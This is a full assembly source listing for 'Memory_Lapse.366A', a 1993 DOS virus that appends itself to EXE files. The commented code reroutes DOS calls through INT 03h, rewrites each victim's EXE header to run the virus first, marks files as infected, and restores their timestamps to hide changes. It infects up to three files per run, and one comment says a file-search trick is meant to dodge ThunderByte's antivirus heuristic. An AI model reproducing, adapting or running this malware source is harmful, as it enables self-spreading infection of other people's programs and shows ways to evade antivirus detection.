        title   "Memory_Lapse.366A"
;ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
;º              Assembly Source Listing for Memory_Lapse.366A                º
;º          Copyright (c) 1993 Memory Lapse. All Rights Reserved.            º
;ÇÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¶
;º The Memory_Lapse.366A Virus is a non-encrypting, time/date stamp saving,  º
;º original attribute retaining, disk transfr area preserving, direct action º
;º non-overwriting, appending, EXE infector.                                 º
;ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
       .model   tiny                                  ;_ASSUME CS=DS=ES=SS
       .code                                          ;/
        org     100h                                  ;Origin @ 100h
                                                      ;
start:                                                ;Marks Start of Source
v_start:                                              ;Marks Start of Virus
        call    $+003h                                ;Push IP onto Stack
        pop     bp                                    ;Restore IP into BP
        sub     bp,103h                               ;Subtract for Delta
                                                      ;
        push    es                                    ;Save Segment onto Stack
        pop     di                                    ;Load DI w/DS
        add     di,010h                               ;Locate Start of EXE

        add     di,cs:[bp+word ptr host_bytes+016h]   ;Add CS to Start of EXE
                                                      ;
        push    di cs:[bp+word ptr host_bytes+014h]   ;Push CS & IP onto Stack
        push    es ds cs                              ;Push Segments to Stack

        sub     ax,ax                                 ;Load Register w/Zero
        push    ax ax                                 ;Push Registers to Stack
        pop     es ds                                 ;Load Segments w/Zero
                                                      ;
        mov     si,021h*004h                          ;DS:[SI] > INT 21 Vector
        mov     di,003h*004h                          ;ES:[DI] > INT 03 Vector
                                                      ;
        movsw                                         ;DS:[SI] -> ES:[DI]
        movsw                                         ;DS:[SI] -> ES:[DI]
                                                      ;
        pop     ds                                    ;Restore DS (CS=DS)
                                                      ;
        mov     ah,030h                               ;AH=30h / GET DOS VERS'N
        int     003h                                  ;DOS Services
                                                      ;
        cmp     al,003h                               ;Is it DOS 3.0?
        jb      returntohost                          ;Jump if Below
                                                      ;
        mov     ah,01Ah                               ;AH=1Ah / SET DTA
        lea     dx,cs:[bp+DTA]                        ;DX=Location of DTA
        int     003h                                  ;DOS Services
                                                      ;
        mov     [bp+byte ptr file_count],003h         ;Memory Segment = 003h
                                                      ;
findfirstEXEfile:                                     ;
        mov     ah,04Eh                               ;AH=4Eh / FINDFIRST
        mov     cx,1FFh                               ;CX=Attribute Masking
        lea     dx,cs:[bp+fileEXEspec]                ;DX=File Search Type
                                                      ;
twilightZONE:                                         ;
        int     003h                                  ;DOS Services
                                                      ;
        jc      doneEXEinfect                         ;Jump if Carry Set
                                                      ;
        jmp     SHORT infectEXEfile                   ;Unconditional Jump
                                                      ;
findnextEXEfile:                                      ;
        cmp     [bp+byte ptr file_count],000h         ;Infected 3 Files?
        je      doneEXEinfect                         ;Jump if Equal/Zero
                                                      ;
        mov     ah,04Fh                               ;AH=4Fh / FINDNEXT
                                                      ;
        jmp     SHORT twilightZONE                    ;Unconditional Jump
                                                      ;
doneEXEinfect:                                        ;
        mov     ah,01Ah                               ;AH=1Ah / SET DTA
        mov     dx,080h                               ;DX=080h / Start of CMD
        int     003h                                  ;DOS Services
                                                      ;
returntohost:                                         ;
        pop     ds es                                 ;Restore Segments
                                                      ;
        retf                                          ;Return Far
                                                      ;
virus_name      db      'Memory_Lapse.366A  (07/01/93)',000h
                db      'Copyright (c) 1993 Memory Lapse',000h
                                                      ;
infectEXEfile:                                        ;
        mov     ax,3D00h                              ;AX=3D00h / OPEN
        lea     dx,cs:[bp+DTA+01Eh]                   ;DX=ASCIIZ File Name
        int     003h                                  ;DOS Services
                                                      ;
        xchg    bx,ax                                 ;Exchange Register Value
                                                      ;
        push    bx                                    ;Save File Handle
                                                      ;
        mov     ax,1220h                              ;AX=1220h /
        int     2Fh                                   ;Multiplex Interrupt
                                                      ;
        mov     bl,es:[di]                            ;
                                                      ;
        mov     ax,1215h                              ;AX=1215h /
        inc     ax                                    ;AX=1216h /
        int     2Fh                                   ;Multiplex Interrupt
                                                      ;
        pop     bx                                    ;Restore File Handle
                                                      ;
        mov     es:[di+word ptr 002h],002h            ;Open for Read / Write
                                                      ;
        mov     ah,03Fh                               ;AH=3Fh / READ
        mov     cx,018h                               ;CX=Number of Bytes
        lea     dx,ds:[bp+host_bytes]                 ;DX=Buffer for Data
        int     003h                                  ;DOS Services
                                                      ;
        cmp     ds:[bp+word ptr host_bytes+000h],'ZM' ;Are We A Valid EXE?
        jnz     closeEXEfile                          ;Jump if Not Equal/Zero
                                                      ;
        cmp     ds:[bp+word ptr host_bytes+012h],'LM' ;Are We Infected?
        jz      closeEXEfile                          ;Jump if Equal/Zero
                                                      ;
        mov     ax,4202h                              ;AX=4202h / LSEEK EOF
        sub     cx,cx                                 ;Load Register w/Zero
        cwd                                           ;Load Register w/Zero
        int     003h                                  ;DOS Services
                                                      ;
        push    dx ax                                 ;Save Registers on Stack
                                                      ;
        mov     ah,040h                               ;AH=40h / WRITE
        mov     cx,(v_end-v_start)                    ;CX=Number of Bytes
        lea     dx,cs:[bp+v_start]                    ;DX=Location of Data
        int     003h                                  ;DOS Services
                                                      ;
        mov     ax,4202h                              ;AX=4202h / LSEEK EOF
        xor     cx,cx                                 ;Load Register w/Zero
        cwd                                           ;Load Register w/Zero
        int     003h                                  ;DOS Services
                                                      ;
        mov     cx,200h                               ;CX=Number to Divide By
        div     cx                                    ;Divide AX by CX
                                                      ;
        inc     ax                                    ;Increment AX
                                                      ;
        mov     ds:[bp+word ptr host_bytes+004h],ax   ;# of Pages in File
        mov     ds:[bp+word ptr host_bytes+002h],dx   ;# of Bytes @ Last Page
                                                      ;
        pop     ax dx                                 ;Restore Registers
                                                      ;
        mov     cx,010h                               ;CX=Number to Divide By
        div     cx                                    ;Divide AX by CX
                                                      ;
        sub     ax,ds:[bp+word ptr host_bytes+008h]   ;Subtract Header Size
                                                      ;
        mov     ds:[bp+word ptr host_bytes+016h],ax   ;CS=Location of Virus
        mov     ds:[bp+word ptr host_bytes+014h],dx   ;IP=Start of Virus
        mov     ds:[bp+word ptr host_bytes+012h],'LM' ;CRC=Infection Marker
                                                      ;
        mov     es:[di+word ptr 015h],000h            ;Move File Pointer to
        mov     es:[di+word ptr 017h],000h            ;Start of File Using SFT
                                                      ;
        mov     ah,040h                               ;AH=40h / WRITE
        mov     cx,018h                               ;CX=Number of Bytes
        lea     dx,ds:[bp+host_bytes]                 ;DX=Location of Data
        int     003h                                  ;DOS Services
                                                      ;
        mov     ax,5701h                              ;AX=5701h / SET T/D
        mov     cx,cs:[bp+word ptr DTA+016h]          ;CX=Original Time @ DTA
        mov     dx,cs:[bp+word ptr DTA+018h]          ;DX=Original Date @ DTA
        int     003h                                  ;DOS Services
                                                      ;
        dec     [bp+byte ptr file_count]              ;Decrement Counter
                                                      ;
closeEXEfile:                                         ;
        mov     ah,03Eh                               ;AH=3Eh / CLOSE File
        int     003h                                  ;DOS Services
                                                      ;
        jmp     findnextEXEfile                       ;Unconditional Jump
                                                      ;
host_bytes      db      016h dup (000h)               ;Buffer for Starting
                dw      0FFF0h                        ;of the EXE header.
                db      002h dup (000h)               ;
                                                      ;
;Get Rid of ThunderByte's "Searches for COM/EXE Files" Heuristic Flag
                                                      ;
fileEXEspec     db      '*M.EXE',000h                 ;ASCIIZ File Specifics
                                                      ;
v_end:                                                ;Marks End of Virus
                                                      ;
file_count      db      001h dup (?)                  ;Buffer for Counter
DTA             db      02Ah dup (?)                  ;Buffer for DTA
                                                      ;
end     start                                         ;Marks End of Source
